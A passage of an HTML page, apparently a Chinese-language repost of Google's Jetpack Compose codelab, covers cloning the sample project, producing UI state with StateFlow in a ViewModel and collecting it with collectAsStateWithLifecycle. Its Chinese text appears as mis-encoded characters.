<li>å¦‚ä½•ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberCoroutineScope(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#rememberCoroutineScope(kotlin.Function0)" ref="nofollow noopener noreferrer"><code>rememberCoroutineScope</code></a>Â API åœ¨å¯ç»„åˆé¡¹ä¸­åˆ›å»ºåç¨‹å¹¶è°ƒç”¨æŒ‚èµ·å‡½æ•°ã€‚</li>
</ul>
<h3 data-id="heading-2">æ„å»ºå†…å®¹</h3>
<p>åœ¨æ­¤ Codelab ä¸­ï¼Œæ‚¨å°†ä»ä¸€ä¸ªæœªå®Œæˆçš„åº”ç”¨ï¼ˆå³Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmaterial.io%2Fdesign%2Fmaterial-studies%2Fcrane.html" target="_blank" title="https://material.io/design/material-studies/crane.html" ref="nofollow noopener noreferrer">Crane ææ–™ç ”ç©¶</a>åº”ç”¨ï¼‰ç€æ‰‹ï¼Œå¹¶ä¸”å°†æ·»åŠ ä¸€äº›åŠŸèƒ½æ¥æ”¹è¿›è¯¥åº”ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/218536e9496a435fb0681a2146737071~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=kqIGHfyp0F6%2F%2F%2FJJ5fFJJuqCOMM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">2. å‡†å¤‡å·¥ä½œ</h2>
<h3 data-id="heading-4">è·å–ä»£ç </h3>
<p>æ­¤ Codelab çš„ä»£ç å¯ä»¥åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgooglecodelabs%2Fandroid-compose-codelabs" target="_blank" title="https://github.com/googlecodelabs/android-compose-codelabs" ref="nofollow noopener noreferrer">android-compose-codelabs GitHub ä»£ç åº“</a>ä¸­æ‰¾åˆ°ã€‚å¦‚éœ€å…‹éš†è¯¥ä»£ç åº“ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash">git <span class="hljs-built_in">clone</span> https://github.com/android/codelab-android-compose</span>
</code></pre>
<p>æˆ–è€…ï¼Œæ‚¨ä¹Ÿèƒ½ä»¥ Zip æ–‡ä»¶çš„å½¢å¼ä¸‹è½½è¯¥ä»£ç åº“ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fcodelab-android-compose%2Farchive%2Fmain.zip" target="_blank" title="https://github.com/android/codelab-android-compose/archive/main.zip" ref="nofollow noopener noreferrer">file_downloadä¸‹è½½ ZIP æ–‡ä»¶</a></p>
<h3 data-id="heading-5">æŸ¥çœ‹ç¤ºä¾‹åº”ç”¨</h3>
<p>æ‚¨åˆšåˆšä¸‹è½½çš„ä»£ç åŒ…å«æä¾›çš„æ‰€æœ‰ Compose Codelab çš„ä»£ç ã€‚ä¸ºäº†å®Œæˆæ­¤ Codelabï¼Œè¯·åœ¨ Android Studio ä¸­æ‰“å¼€Â <strong><code>AdvancedStateAndSideEffectsCodelab</code></strong>Â é¡¹ç›®ã€‚</p>
<blockquote>
<p>compose-codelabs åº“åŒ…å«å¼€å‘è€…åœ¨çº¿è¯¾ç¨‹ä¸­æ‰€æœ‰ Codelab çš„èµ·å§‹ä»£ç ã€‚</p>
<p>å¯¹äºæ­¤ Codelabï¼Œè¯·ä½¿ç”¨Â <strong>AdvancedStateAndSideEffectsCodelab</strong>Â é¡¹ç›®ã€‚</p>
<ul>
<li><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6403907abaa41fab678e0688b3684a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=hEMriE4dN0WgBVdsYRGV959b%2FMs%3D" alt="android_studio_folder.png" loading="lazy"/>Â <strong>AdvancedStateAndSideEffectsCodelab</strong>Â - è¯¥é¡¹ç›®åŒ…å«æ­¤ Codelab çš„èµ·å§‹ä»£ç å’Œå®Œæˆåçš„ä»£ç ã€‚</li>
</ul>
<p>è¯¥é¡¹ç›®åœ¨å¤šä¸ª git åˆ†æ”¯ä¸­æ„å»ºè€Œæˆï¼š</p>
<ul>
<li><strong>main</strong>Â - è¯¥é¡¹ç›®çš„èµ·å§‹ä»£ç ï¼›æ‚¨å°†æ›´æ”¹è¿™äº›ä»£ç æ¥å®Œæˆæ­¤ Codelabã€‚</li>
<li><strong>end</strong>Â - åŒ…å«æ­¤ Codelab çš„è§£å†³æ–¹æ¡ˆã€‚</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬å»ºè®®æ‚¨ä» main åˆ†æ”¯ä¸­çš„ä»£ç ç€æ‰‹ï¼ŒæŒ‰ç…§è‡ªå·±çš„èŠ‚å¥é€æ­¥å®Œæˆæ­¤ Codelabã€‚</p>
<p>åœ¨æœ¬ Codelab ä¸­ï¼Œç³»ç»Ÿä¼šä¸ºæ‚¨æ˜¾ç¤ºéœ€è¦æ·»åŠ åˆ°é¡¹ç›®çš„ä»£ç æ®µã€‚åœ¨æŸäº›åœ°æ–¹ï¼Œæ‚¨è¿˜éœ€è¦ç§»é™¤åœ¨ä»£ç æ®µçš„æ³¨é‡Šä¸­æ˜ç¡®æåŠçš„ä»£ç ã€‚</p>
<h3 data-id="heading-6">ç†Ÿæ‚‰ä»£ç å¹¶è¿è¡Œç¤ºä¾‹åº”ç”¨</h3>
<p>å…ˆèŠ±ç‚¹æ—¶é—´æµè§ˆä¸€ä¸‹é¡¹ç›®ç»“æ„ï¼Œç„¶åå†è¿è¡Œåº”ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0938746571fd46028bd2fbae0acdd71d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=wajQEIjQPPLXYQhdH224t6h55Ks%3D" alt="162c42b19dafa701.png" loading="lazy"/></p>
<p>ä» main åˆ†æ”¯è¿è¡Œåº”ç”¨æ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ°æŸäº›åŠŸèƒ½ï¼ˆå¦‚æŠ½å±‰å¼å¯¼èˆªæ æˆ–åŠ è½½èˆªç­ç›®çš„åœ°çš„åŠŸèƒ½ï¼‰ä¸èµ·ä½œç”¨ï¼è¿™å°±æ˜¯æ‚¨åœ¨æ­¤ Codelab çš„åç»­æ­¥éª¤ä¸­è¦æ”¹è¿›çš„åœ°æ–¹ã€‚</p>
<h3 data-id="heading-7">ç•Œé¢æµ‹è¯•</h3>
<p>ç³»ç»Ÿä¼šå¯¹åº”ç”¨æ‰§è¡ŒÂ <code>androidTest</code>Â æ–‡ä»¶å¤¹ä¸­æä¾›çš„éå¸¸åŸºæœ¬çš„ç•Œé¢æµ‹è¯•ã€‚å¯¹äºÂ <code>main</code>Â å’ŒÂ <code>end</code>Â åˆ†æ”¯ï¼Œå§‹ç»ˆéƒ½åº”é€šè¿‡è¿™äº›æµ‹è¯•ã€‚</p>
<h3 data-id="heading-8">[å¯é€‰] åœ¨è¯¦æƒ…å±å¹•ä¸Šæ˜¾ç¤ºåœ°å›¾</h3>
<p>å®Œå…¨æ²¡æœ‰å¿…è¦æŒ‰ç…§ç›¸å…³è¯´æ˜åœ¨è¯¦æƒ…å±å¹•ä¸Šæ˜¾ç¤ºåŸå¸‚åœ°å›¾ã€‚ä¸è¿‡ï¼Œå¦‚æœæ‚¨æƒ³è¦çœ‹åˆ°åœ°å›¾ï¼Œé‚£ä¹ˆéœ€è¦è·å–ä¸ªäºº API å¯†é’¥ï¼Œå¦‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fmaps%2Fdocumentation%2Fandroid-sdk%2Fget-api-key%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/maps/documentation/android-sdk/get-api-key?hl=zh-cn" ref="nofollow noopener noreferrer">â€œåœ°å›¾â€æ–‡æ¡£</a>ä¸­æ‰€è¿°ã€‚æŒ‰å¦‚ä¸‹æ–¹å¼åœ¨Â <code>local.properties</code>Â æ–‡ä»¶ä¸­æ·»åŠ è¯¥å¯†é’¥ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// local.properties file
<span class="hljs-attr">google.maps.key</span>={insert_your_api_key_here}
</code></pre>
<blockquote>
<p>åœ¨ Google ä¿¡æ¯ä¸­å¿ƒå†…è®¾ç½®å‡­æ®æ—¶ï¼ŒåŠ¡å¿…å°†Â <code>androidx.compose.samples.crane</code>Â ç”¨ä½œè½¯ä»¶åŒ…åç§°ï¼Œå¹¶å°†Â <code>A0:BD:B3:B6:F0:C4:BE:90:C6:9D:5F:4C:1D:F0:90:80:7F:D7:FE:1F</code>Â ç”¨ä½œ SHA-1 è¯ä¹¦æŒ‡çº¹ã€‚</p>
</blockquote>
<h3 data-id="heading-9">æ­¤ Codelab çš„è§£å†³æ–¹æ¡ˆ</h3>
<p>å¦‚éœ€ä½¿ç”¨ git è·å–Â <code>end</code>Â åˆ†æ”¯ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable">$ </span>git clone -b <span class="hljs-keyword">end</span> <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/android</span><span class="hljs-regexp">/codelab-android-compose
</span></code></pre>
<p>æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½è§£å†³æ–¹æ¡ˆä»£ç ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fcodelab-android-compose%2Farchive%2Fend.zip" target="_blank" title="https://github.com/android/codelab-android-compose/archive/end.zip" ref="nofollow noopener noreferrer">file_downloadä¸‹è½½æœ€ç»ˆä»£ç </a></p>
<h2 data-id="heading-10">3. ç•Œé¢çŠ¶æ€ç”Ÿæˆæµæ°´çº¿</h2>
<p>æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œä»Â <code>main</code>Â åˆ†æ”¯è¿è¡Œåº”ç”¨æ—¶ï¼Œèˆªç­ç›®çš„åœ°åˆ—è¡¨ä¸ºç©ºï¼</p>
<p>å¦‚è¦è§£å†³æ­¤é—®é¢˜ï¼Œæ‚¨å¿…é¡»å®Œæˆä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Flibraries%2Farchitecture%2Fviewmodel%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/topic/libraries/architecture/viewmodel?hl=zh-cn" ref="nofollow noopener noreferrer"><code>ViewModel</code></a>Â ä¸­æ·»åŠ é€»è¾‘ä»¥ç”Ÿæˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Farchitecture%2Fui-layer%2Fstateholders%3Fhl%3Dzh-cn%23elements-ui" target="_blank" title="https://developer.android.com/topic/architecture/ui-layer/stateholders?hl=zh-cn#elements-ui" ref="nofollow noopener noreferrer">ç•Œé¢çŠ¶æ€</a>ã€‚åœ¨æœ¬ç¤ºä¾‹ä¸­ï¼Œå³æ¨èç›®çš„åœ°åˆ—è¡¨ã€‚</li>
<li>ä»ç•Œé¢å–ç”¨è¯¥ç•Œé¢çŠ¶æ€ï¼Œè¿™æ ·å°±ä¼šåœ¨ç”»é¢ä¸Šæ˜¾ç¤ºç•Œé¢ã€‚</li>
</ul>
<p>è‰¯å¥½çš„åº”ç”¨æ¶æ„ä¼šåˆ†å±‚çº§ï¼Œéµå¾ªåŸºæœ¬çš„è‰¯å¥½ç³»ç»Ÿè®¾è®¡å®è·µï¼Œä¾‹å¦‚å…³æ³¨ç‚¹åˆ†ç¦»å’Œå¯æµ‹è¯•æ€§ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Farchitecture%2Fui-layer%2Fstate-production%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/topic/architecture/ui-layer/state-production?hl=zh-cn" ref="nofollow noopener noreferrer">ç•Œé¢çŠ¶æ€ç”Ÿæˆ</a>æ˜¯æŒ‡ä»¥ä¸‹è¿‡ç¨‹ï¼šåº”ç”¨è®¿é—®æ•°æ®å±‚ã€åº”ç”¨ä¸šåŠ¡è§„åˆ™ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œä»¥åŠå…¬å¼€è¦ä»ç•Œé¢å–ç”¨çš„ç•Œé¢çŠ¶æ€ã€‚</p>
<p>æ­¤åº”ç”¨ä¸­çš„æ•°æ®å±‚å·²å®ç°ã€‚ç°åœ¨ï¼Œæ‚¨å°†ç”ŸæˆçŠ¶æ€ï¼ˆæ¨èç›®çš„åœ°åˆ—è¡¨ï¼‰ï¼Œä»¥ä¾¿ç•Œé¢å¯ä»¥å–ç”¨è¯¥çŠ¶æ€ã€‚</p>
<p>æœ‰å‡ ä¸ª API å¯ç”¨äºç”Ÿæˆç•Œé¢çŠ¶æ€ã€‚å¦‚è¦äº†è§£æ›¿ä»£æ–¹æ¡ˆï¼Œè¯·å‚é˜…<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Farchitecture%2Fui-layer%2Fstate-production%3Fhl%3Dzh-cn%23output-types" target="_blank" title="https://developer.android.com/topic/architecture/ui-layer/state-production?hl=zh-cn#output-types" ref="nofollow noopener noreferrer">çŠ¶æ€ç”Ÿæˆæµæ°´çº¿ä¸­çš„è¾“å‡ºç±»å‹</a>æ–‡æ¡£ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œæœ€å¥½ä½¿ç”¨ Kotlin çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fkotlinx.coroutines%2Fkotlinx-coroutines-core%2Fkotlinx.coroutines.flow%2F-state-flow%2F" target="_blank" title="https://kotlinlang.org/api/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/-state-flow/" ref="nofollow noopener noreferrer"><code>StateFlow</code></a>Â ç”Ÿæˆç•Œé¢çŠ¶æ€ã€‚</p>
<p>å¦‚è¦ç”Ÿæˆç•Œé¢çŠ¶æ€ï¼Œè¯·æŒ‰ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p>
<ol>
<li>æ‰“å¼€Â <code>home/MainViewModel.kt</code>ã€‚</li>
<li>å®šä¹‰ä¸€ä¸ªç±»å‹ä¸ºÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fkotlinx.coroutines%2Fkotlinx-coroutines-core%2Fkotlinx.coroutines.flow%2F-mutable-state-flow%2F" target="_blank" title="https://kotlinlang.org/api/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/-mutable-state-flow/" ref="nofollow noopener noreferrer"><code>MutableStateFlow</code></a>Â çš„ç§æœ‰Â <code>_suggestedDestinations</code>Â å˜é‡ï¼Œç”¨äºè¡¨ç¤ºæ¨èç›®çš„åœ°åˆ—è¡¨ï¼Œå¹¶å°†ç©ºåˆ—è¡¨è®¾ç½®ä¸ºèµ·å§‹å€¼ã€‚</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _suggestedDestinations = MutableStateFlow&lt;List&lt;ExploreModel&gt;&gt;(emptyList())
</code></pre>
<ol start="3">
<li>å®šä¹‰ç¬¬äºŒä¸ªä¸å¯å˜å˜é‡Â <code>suggestedDestinations</code>ï¼Œç±»å‹ä¸ºÂ <code>StateFlow</code>ã€‚è¿™æ˜¯å¯ä»ç•Œé¢å–ç”¨çš„å…¬å¼€åªè¯»å˜é‡ã€‚å»ºè®®æ‚¨å…¬å¼€åªè¯»å˜é‡ï¼Œå¹¶åœ¨å†…éƒ¨ä½¿ç”¨å¯å˜å˜é‡ã€‚è¿™æ ·åšå¯ç¡®ä¿ç•Œé¢çŠ¶æ€æ— æ³•ä¿®æ”¹ï¼Œé™¤éé€šè¿‡Â <code>ViewModel</code>Â ä½¿å…¶æˆä¸ºå•ä¸€å¯ä¿¡æ¥æºã€‚æ‰©å±•å‡½æ•°Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fkotlinx.coroutines%2Fkotlinx-coroutines-core%2Fkotlinx.coroutines.flow%2Fas-state-flow.html" target="_blank" title="https://kotlinlang.org/api/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/as-state-flow.html" ref="nofollow noopener noreferrer"><code>asStateFlow</code></a>Â ä¼šå°†å¯å˜æµè½¬æ¢ä¸ºä¸å¯å˜æµã€‚</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _suggestedDestinations = MutableStateFlow&lt;List&lt;ExploreModel&gt;&gt;(emptyList())

<span class="hljs-keyword">val</span> suggestedDestinations: StateFlow&lt;List&lt;ExploreModel&gt;&gt; = _suggestedDestinations.asStateFlow()
</code></pre>
<ol start="4">
<li>åœ¨Â <code>ViewModel</code>Â çš„ init å—ä¸­ï¼Œæ·»åŠ æ¥è‡ªÂ <code>destinationsRepository</code>Â çš„è°ƒç”¨ï¼Œä»¥ä¾¿ä»æ•°æ®å±‚è·å–ç›®çš„åœ°ã€‚</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _suggestedDestinations = MutableStateFlow&lt;List&lt;ExploreModel&gt;&gt;(emptyList())

<span class="hljs-keyword">val</span> suggestedDestinations: StateFlow&lt;List&lt;ExploreModel&gt;&gt; = _suggestedDestinations.asStateFlow()

<span class="hljs-keyword">init</span> {
Â  Â  _suggestedDestinations.value = destinationsRepository.destinations
}
</code></pre>
<ol start="5">
<li>æœ€åï¼Œå–æ¶ˆæ³¨é‡Šåœ¨æ­¤ç±»ä¸­æ‰¾åˆ°çš„å†…éƒ¨å˜é‡Â <code>_suggestedDestinations</code>Â ä½¿ç”¨æƒ…å†µï¼Œä»¥ä¾¿å¯é€šè¿‡æ¥è‡ªç•Œé¢çš„äº‹ä»¶æ­£ç¡®æ›´æ–°è¯¥å˜é‡ã€‚</li>
</ol>
<p>ç°åœ¨ï¼Œ<code>ViewModel</code>Â èƒ½å¤Ÿç”Ÿæˆç•Œé¢çŠ¶æ€ã€‚åœ¨ä¸‹ä¸€æ­¥ä¸­ï¼Œæ‚¨å°†ä»ç•Œé¢å–ç”¨æ­¤çŠ¶æ€ã€‚</p>
<h2 data-id="heading-11">4. ä» ViewModel å®‰å…¨åœ°ä½¿ç”¨æµ</h2>
<p>èˆªç­ç›®çš„åœ°åˆ—è¡¨ä»ç„¶ä¸ºç©ºã€‚åœ¨ä¸Šä¸€æ­¥ä¸­ï¼Œæ‚¨åœ¨Â <code>MainViewModel</code>Â ä¸­ç”Ÿæˆäº†ç•Œé¢çŠ¶æ€ã€‚ç°åœ¨ï¼Œæ‚¨å°†ä½¿ç”¨è¦åœ¨ç•Œé¢ä¸­æ˜¾ç¤ºå¹¶ç”±Â <code>MainViewModel</code>Â å…¬å¼€çš„ç•Œé¢çŠ¶æ€ã€‚</p>
<p>æ‰“å¼€Â <code>home/CraneHome.kt</code>Â æ–‡ä»¶å¹¶æŸ¥çœ‹Â <code>CraneHomeContent</code>Â å¯ç»„åˆé¡¹ã€‚</p>
<p>è¢«åˆ†é…ç»™ä¸€ä¸ªè®°ä½çš„ç©ºåˆ—è¡¨çš„Â <code>suggestedDestinations</code>Â çš„å®šä¹‰ä¸Šé¢æœ‰ä¸€æ¡ TODO æ³¨é‡Šã€‚è¿™å°±æ˜¯å±å¹•ä¸Šæ˜¾ç¤ºçš„å†…å®¹ï¼šä¸€ä¸ªç©ºåˆ—è¡¨ï¼åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œæ‚¨å°†è§£å†³è¯¥é—®é¢˜ï¼Œå¹¶æ˜¾ç¤ºÂ <code>MainViewModel</code>Â å…¬å¼€çš„æ¨èç›®çš„åœ°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fa34cb764894f04ba0583dc19732ebe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=C9umu%2BSd9r5UJA%2FzEi%2FkfXYu8z8%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰“å¼€Â <code>home/MainViewModel.kt</code>Â å¹¶æŸ¥çœ‹Â <code>suggestedDestinations</code>Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fkotlin%2Fflow%2Fstateflow-and-sharedflow%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/kotlin/flow/stateflow-and-sharedflow?hl=zh-cn" ref="nofollow noopener noreferrer">StateFlow</a>ï¼Œè¯¥ StateFlow åˆå§‹åŒ–ä¸ºÂ <code>destinationsRepository.destinations</code>ï¼Œå¹¶ä¸”ä¼šåœ¨è°ƒç”¨Â <code>updatePeople</code>Â æˆ–Â <code>toDestinationChanged</code>Â å‡½æ•°æ—¶å¾—åˆ°æ›´æ–°ã€‚</p>
<p>æ‚¨å¸Œæœ›æ¯å½“æœ‰æ–°é¡¹è¢«å‘é€åˆ°Â <code>suggestedDestinations</code>Â æ•°æ®æµæ—¶Â <code>CraneHomeContent</code>Â å¯ç»„åˆé¡¹ä¸­çš„ç•Œé¢éƒ½ä¼šæ›´æ–°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Flifecycle%2Fcompose%2Fpackage-summary%3Fhl%3Dzh-cn%23(kotlinx.coroutines.flow.Flow).collectAsStateWithLifecycle(kotlin.Any%2Candroidx.lifecycle.Lifecycle%2Candroidx.lifecycle.Lifecycle.State%2Ckotlin.coroutines.CoroutineContext)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/lifecycle/compose/package-summary?hl=zh-cn#(kotlinx.coroutines.flow.Flow).collectAsStateWithLifecycle(kotlin.Any,androidx.lifecycle.Lifecycle,androidx.lifecycle.Lifecycle.State,kotlin.coroutines.CoroutineContext)" ref="nofollow noopener noreferrer"><code>collectAsStateWithLifecycle()</code></a>Â å‡½æ•°ã€‚<code>collectAsStateWithLifecycle()</code>Â ä¼šä»¥ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹æ–¹å¼ä»Â <code>StateFlow</code>Â æ”¶é›†å€¼å¹¶é€šè¿‡ Compose çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2FState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/State?hl=zh-cn" ref="nofollow noopener noreferrer">State</a>Â API è¡¨ç¤ºæœ€æ–°å€¼ã€‚è¿™æ ·ä¼šä½¿è¯»å–è¯¥çŠ¶æ€å€¼çš„ Compose ä»£ç åœ¨å‘å‡ºæ–°é¡¹æ—¶é‡ç»„ã€‚</p>
<p>å¦‚éœ€å¼€å§‹ä½¿ç”¨Â <code>collectAsStateWithLifecycle</code>Â APIï¼Œè¯·å…ˆåœ¨Â <code>app/build.gradle</code>Â ä¸­æ·»åŠ ä»¥ä¸‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fandroidx%2Freleases%2Flifecycle%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/androidx/releases/lifecycle?hl=zh-cn" ref="nofollow noopener noreferrer">ä¾èµ–é¡¹</a>ã€‚å˜é‡Â <code>lifecycle_version</code>Â å·²åœ¨é¡¹ç›®ä¸­ä½¿ç”¨é€‚å½“ç‰ˆæœ¬è¿›è¡Œå®šä¹‰ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">dependencies {
Â  Â  implementation <span class="hljs-string">"androidx.lifecycle:lifecycle-runtime-compose:<span class="hljs-variable">$lifecycle_version</span>"</span>
}
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚éœ€è¯¦ç»†äº†è§£Â <code>collectAsStateWithLifecycle()</code>Â APIï¼Œè¯·å‚é˜…<a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fandroiddevelopers%2Fconsuming-flows-safely-in-jetpack-compose-cde014d0d5a3" target="_blank" title="https://medium.com/androiddevelopers/consuming-flows-safely-in-jetpack-compose-cde014d0d5a3" ref="nofollow noopener noreferrer">åœ¨ Jetpack Compose ä¸­å®‰å…¨åœ°ä½¿ç”¨æµ</a>è¿™ç¯‡åšæ–‡ã€‚</p>
</blockquote>
<p>è¿”å›Â <code>CraneHomeContent</code>Â å¯ç»„åˆé¡¹ï¼Œå¹¶å°†åˆ†é…Â <code>suggestedDestinations</code>Â çš„ä»£ç è¡Œæ›¿æ¢ä¸ºÂ <code>ViewModel</code>Â çš„Â <code>suggestedDestinations</code>Â å±æ€§ä¸Šçš„Â <code>collectAsStateWithLifecycle</code>Â è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> androidx.lifecycle.compose.collectAsStateWithLifecycle

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CraneHomeContent</span><span class="hljs-params">(
Â  Â  onExploreItemClicked: <span class="hljs-type">OnExploreItemClicked</span>,
Â  Â  openDrawer: () -&gt; <span class="hljs-type">Unit</span>,
Â  Â  modifier: <span class="hljs-type">Modifier</span> = Modifier,
Â  Â  viewModel: <span class="hljs-type">MainViewModel</span> = viewModel()</span></span>,
) {
Â  Â  <span class="hljs-keyword">val</span> suggestedDestinations <span class="hljs-keyword">by</span> viewModel.suggestedDestinations.collectAsStateWithLifecycle()
Â  Â  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>å¦‚æœæ‚¨è¿è¡Œåº”ç”¨ï¼Œæ‚¨ä¼šçœ‹åˆ°ç›®çš„åœ°åˆ—è¡¨å·²å¡«å……ï¼Œå¹¶ä¸”æ¯å½“æ‚¨ç‚¹æŒ‰æ—…è¡Œäººæ•°æ—¶ï¼Œç›®çš„åœ°éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/215aaf4ff0dd4b2192a1bfd293b9768c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=7hq7zWN3WNYFxtSo0dQktRTKMfs%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>Compose è¿˜ä¸ºæœ€çƒ­é—¨çš„åŸºäºæ•°æ®æµçš„ Android è§£å†³æ–¹æ¡ˆæä¾›äº† APIï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Flivedata%2Fpackage-summary%3Fhl%3Dzh-cn%23observeAsState(androidx.lifecycle.LiveData)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/livedata/package-summary?hl=zh-cn#observeAsState(androidx.lifecycle.LiveData)" ref="nofollow noopener noreferrer"><code>LiveData.observeAsState()</code></a>Â åŒ…å«åœ¨Â <code>androidx.compose.runtime:runtime-livedata:$composeVersion</code>Â å·¥ä»¶ä¸­ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Frxjava2%2Fpackage-summary%3Fhl%3Dzh-cn%23subscribeAsState(io.reactivex.Observable%2Ckotlin.Any)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/rxjava2/package-summary?hl=zh-cn#subscribeAsState(io.reactivex.Observable,kotlin.Any)" ref="nofollow noopener noreferrer"><code>Observable.subscribeAsState()</code></a>Â åŒ…å«åœ¨Â <code>androidx.compose.runtime:runtime-rxjava2:$composeVersion</code>Â æˆ–Â <code>androidx.compose.runtime:runtime-rxjava3:$composeVersion</code>Â å·¥ä»¶ä¸­ã€‚</li>
</ul>
